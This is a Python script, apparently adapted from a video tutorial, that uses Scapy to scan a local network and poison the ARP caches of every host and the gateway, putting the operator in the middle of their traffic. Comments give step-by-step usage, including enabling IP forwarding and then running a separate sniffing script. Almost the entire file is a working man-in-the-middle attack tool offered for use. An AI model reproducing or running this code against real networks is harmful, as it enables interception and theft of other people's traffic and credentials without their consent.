#!/usr/bin/env python
#_*_ coding: utf8 _*_
#code by https://www.youtube.com/watch?v=LYodfr9dl8o&t=113s  

#Instructions:
#See help: python3 arpSpoofing.py --help , and you can see the info that the script need to execute
#Range: ifconfig and the range is ej: 192.162.1.1/24 and the gateway: 192.168.1.1
#set: python 4 arpSpoofing.py -r 192.162.1.1/24 -g 192.168.1.1
#change 0 for 1 in /proc/sys/net/ipv4/ip_forward with nano o gedit for get to be router
#first execute this script an then execute mitm script to sniff packages

from scapy.all import *
from colorama import Fore, init
import argparse
import sys

init() #init colorama

parse = argparse.ArgumentParser()#receive arguments through the command line
parse.add_argument("-r", "--range",help="Ip range to scan and spoof")
parse.add_argument("-g", "--gateway",help="Ip of the Gateway/puerta de enlace/router")
parse=parse.parse_args()#established arguments

def getMac(gateway):#obtain the gateway/router or inserted ip mac address
    arpLayer = ARP(pdst=gateway)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    finalPacket = broadcast/arpLayer
    mac = srp(finalPacket, timeout=2, verbose=False)[0]#send the packet via Scapy with timeout and disable the messages, set index position with the mac
    mac = mac[0][1].hwsrc
    return mac

def scannerNet(rango, gateway):#scan all of the range that we establishied in the net
    hostsList = dict() #create a dictionary with the hosts scanned
    arpLayer = ARP(pdst=rango)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")#mac standar
    finalPacket = broadcast/arpLayer
    answers = srp(finalPacket, timeout=2, verbose=False)[0] #send packages again with the range and save the answers for the net
    print("\n")
    for a in answers:
        if a != gateway: #print only the hosts and their mac address with a smart design
            print("[{}+{}] HOST: {} MAC: {}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, a[1].psrc, a[1].hwsrc))
            hostsList.update({a[1].psrc: a[1].hwsrc}) #update the dictionary with the info collected
    
    return hostsList

def restoreArp(destip, sourceip,hwsrc,hwdst):#restore arp tables para evitar que los dispositivos no se queden sin internet
    destMac = hwdst #target mac
    sourceMac = hwsrc #source mac
    packet = ARP(op=2, pdst=destip, hwdst=destMac, psrc=sourceip, hwsrc=sourceMac) #reconfigure the originals mac address of the devices 
    send(packet, verbose=False)

def arpSpoofing(hwdst, pdst, psrc):#spoof all the devices connected in the same red
    spooferPacket = ARP(op=2, hwdst=hwdst, pdst=pdst, psrc=psrc) #send a package to target host, posing as router mac 
    send(spooferPacket, verbose=False)

def main():
    if parse.range and parse.gateway: #if the user insert correctly the options (range and gateway)
        macGateway = getMac(parse.gateway) #get the router mac with the option of the user
        print("Mac of the gateway/router -> {0}".format(macGateway))
        hosts = scannerNet(parse.range, parse.gateway)

        try:
            print("\n[{}+{}] RUNNING...".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX))
            while True: #infinite loop
                for host in hosts:
                    macTarget = hosts[host]
                    ipTarget = host
                    gateway = parse.gateway
                    arpSpoofing(macGateway,gateway,ipTarget) #send to the router pasing as target host
                    arpSpoofing(macTarget, ipTarget, gateway) #send to the target host being as router and in this way confuse the traffic
                    print("\r[{}+{}] Spoofing: {}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, ipTarget))
                    sys.stdout.flush()
        except KeyboardInterrupt: #when keyrecord is ctrl + c restoreArp to avoid problems
            print("\n\nRestoring ARP tables...")
            for host in hosts:
                macTarget = hosts[host]
                ipTarget = host
                gateway = parse.gateway
                restoreArp(gateway, ipTarget, macGateway, macTarget)
                restoreArp(ipTarget,gateway,macTarget,macGateway)
            exit(0)

    else: #if dont set inputs
        print("Set info please")

if __name__ == "__main__":
    main()